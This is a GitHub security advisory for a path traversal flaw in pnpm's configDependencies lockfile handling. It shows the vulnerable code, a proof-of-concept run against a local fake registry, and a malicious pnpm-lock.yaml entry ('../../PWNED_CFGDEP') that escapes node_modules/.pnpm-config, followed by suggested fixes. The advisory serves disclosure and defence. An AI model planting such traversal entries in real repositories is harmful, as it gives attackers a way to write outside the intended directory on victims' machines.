# [H] pnpm: Path traversal in configDependencies env lockfile allows symlink creation outside node_modules/.pnpm-config

## Summary
Severity: High
Advisory: GHSA-qrv3-253h-g69c
CWE: CWE-22
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:H/A:L (CVSS_V3)
Published: 2026-06-27
Source: https://github.com/advisories/GHSA-qrv3-253h-g69c
Type: github-advisory

## Affected
- npm: `pnpm` — affected >=0 <10.34.4
- npm: `pnpm` — affected >=11.0.0 <11.8.0

## Details
## Summary

`pnpm` accepts package names from the env lockfile `configDependencies` section and uses those names directly when creating config dependency symlinks under `node_modules/.pnpm-config`.

A malicious repository can commit a crafted `pnpm-lock.yaml` whose env-lockfile document contains a traversal-shaped config dependency name such as `../../PWNED_CFGDEP`. During `pnpm install`, pnpm installs the config dependency and creates a symlink at a path derived from that name.

In local testing against pnpm `v11.5.1`, this caused pnpm to create a symlink outside the intended config dependency directory:

```text
expected root: /tmp/pnpm-cfgdep-poc-sznwgunx/victim/node_modules/.pnpm-config
actual path:   /tmp/pnpm-cfgdep-poc-sznwgunx/victim/PWNED_CFGDEP
```

This works with `--ignore-scripts`, so it does not rely on lifecycle script execution.

## Vulnerable behavior

The vulnerable behavior appears to be that `configDependencies` keys from the env lockfile are trusted as package names and used in filesystem paths without rejecting traversal components.

The relevant pattern is:

```ts
const configModulesDir = path.join(opts.rootDir, 'node_modules/.pnpm-config')

for (const [pkgName, pkg] of Object.entries(normalizedDeps)) {
  const configDepPath = path.join(configModulesDir, pkgName)

  const pkgDirInGlobalVirtualStore = path.join(
    globalVirtualStoreDir,
    relPath,
    'node_modules',
    pkgName
  )

  await symlinkDir(pkgDirInGlobalVirtualStore, configDepPath)
}
```

If `pkgName` is attacker-controlled and contains `..`, then `path.join(configModulesDir, pkgName)` can resolve outside `node_modules/.pnpm-config`.

## Impact

A malicious project can cause pnpm to create symlinks outside the intended `node_modules/.pnpm-config` directory during install.

This gives an attacker a filesystem write primitive in the victim project directory, and potentially outside it with deeper traversal payloads, depending on path permissions and platform behavior.

The issue is especially relevant because:

* The malicious input is committed in `pnpm-lock.yaml`.
* The issue is triggered during `pnpm install`.
* It works with `--ignore-scripts`.
* It occurs in the config dependency installation path, before ordinary dependency installation.
* The user only needs to install a malicious or compromised repository.

## Local proof of concept

The following local-only PoC creates a temporary project, starts a local fake registry on `127.0.0.1`, writes a malicious env-lockfile entry, runs pnpm, and checks whether pnpm created a symlink outside `node_modules/.pnpm-config`.

Command used:

```bash
python3 ../pnpm_configdeps_path_traversal_poc.py \
  --pnpm-cmd "node /home/ethical/pnpm-main/pnpm/bin/pnpm.cjs" \
  --keep 2>&1 | tee /tmp/pnpm-configdeps-poc.log
```

Observed output:

```text
[+] Test project:       /tmp/pnpm-cfgdep-poc-sznwgunx/victim
[+] Local registry:     http://127.0.0.1:36545/
[+] Store dir:          /tmp/pnpm-cfgdep-poc-sznwgunx/store
[+] Malicious name:     '../../PWNED_CFGDEP'
[+] Intended cfg root:  /tmp/pnpm-cfgdep-poc-sznwgunx/victim/node_modules/.pnpm-config
[+] Traversal sink:     /tmp/pnpm-cfgdep-poc-sznwgunx/victim/PWNED_CFGDEP
[+] Lockfile written:   /tmp/pnpm-cfgdep-poc-sznwgunx/victim/pnpm-lock.yaml
[+] Running: node /home/ethical/pnpm-main/pnpm/bin/pnpm.cjs install --ignore-scripts --config.confirmModulesPurge=false --reporter=append-only --store-dir /tmp/pnpm-cfgdep-poc-sznwgunx/store --registry http://127.0.0.1:36545/
```

pnpm output:

```text
Installing config dependencies...
Installed config dependencies: ../../PWNED_CFGDEP@1.0.0, legit-config-dep@1.0.0
Already up to date

Done in 906ms using pnpm v11.5.1
```

The PoC then detected the escaped symlink:

```text
[+] Traversal sink status: symlink -> ../store/v11/PWNED_CFGDEP/1.0.0/PWNED_CFGDEP

[VULNERABLE] pnpm created/modified a path derived from a lockfile package name outside node_modules/.pnpm-config
            sink = /tmp/pnpm-cfgdep-poc-sznwgunx/victim/PWNED_CFGDEP
            readlink = ../store/v11/PWNED_CFGDEP/1.0.0/PWNED_CFGDEP
```

## Malicious lockfile structure

The malicious input is an env-lockfile `configDependencies` key containing traversal components:

```yaml
importers:
  .:
    configDependencies:
      legit-config-dep:
        specifier: '1.0.0'
        version: '1.0.0'
      '../../PWNED_CFGDEP':
        specifier: '1.0.0'
        version: '1.0.0'
```

pnpm accepts the traversal-shaped name and reports it as installed:

```text
Installed config dependencies: ../../PWNED_CFGDEP@1.0.0, legit-config-dep@1.0.0
```

## Security boundary violation

The intended config dependency root was:

```text
/tmp/pnpm-cfgdep-poc-sznwgunx/victim/node_modules/.pnpm-config
```

But pnpm created:

```text
/tmp/pnpm-cfgdep-poc-sznwgunx/victim/PWNED_CFGDEP
```

This demonstrates that a config dependency name from the lockfile can escape the directory where config dependencies should be linked.

## Suggested remediation

Validate every `configDependencies` key loaded from the env lockfile before using it as a package name or path component.

Recommended fixes:

1. Reject env-lockfile `configDependencies` names that are not valid npm package names.
2. Reject names containing absolute paths, `.` components, `..` components, backslashes, or platform-specific path separators.
3. Use containment-checked path joining before creating symlinks:

   * resolve the final destination path,
   * verify it remains inside `node_modules/.pnpm-config`,
   * reject if it escapes.
4. Apply the same validation to config dependency subdependencies and optional dependency names read from the env lockfile.
5. Intersect env-lockfile `configDependencies` with the effective `pnpm-workspace.yaml` `configDependencies` before installing, so extra lockfile-only entries are rejected.

A safe destination check should enforce behavior equivalent to:

```ts
const dest = path.resolve(configModulesDir, pkgName)

if (!dest.startsWith(path.resolve(configModulesDir) + path.sep)) {
  throw new Error(`Invalid config dependency name: ${pkgName}`)
}
```

Name validation should happen before this check, not instead of it.

## References
- https://github.com/pnpm/pnpm/security/advisories/GHSA-qrv3-253h-g69c
- https://github.com/pnpm/pnpm
